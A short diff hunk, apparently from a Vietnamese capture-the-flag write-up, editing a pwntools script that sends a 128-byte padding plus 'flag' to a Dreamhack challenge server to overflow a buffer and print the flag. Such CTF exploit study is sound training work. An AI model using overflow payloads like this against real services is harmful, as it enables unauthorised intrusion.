@@ -14,7 +14,6 @@ Hàm `puts` sẽ làm nốt việc in flag ra màn hình.
     p=remote('host3.dreamhack.games',9551)
     
     p.sendafter('meow? ',b'A'*128+b'flag\n')
-    p.recvuntil(b'flag')
     
     p.interactive()
 
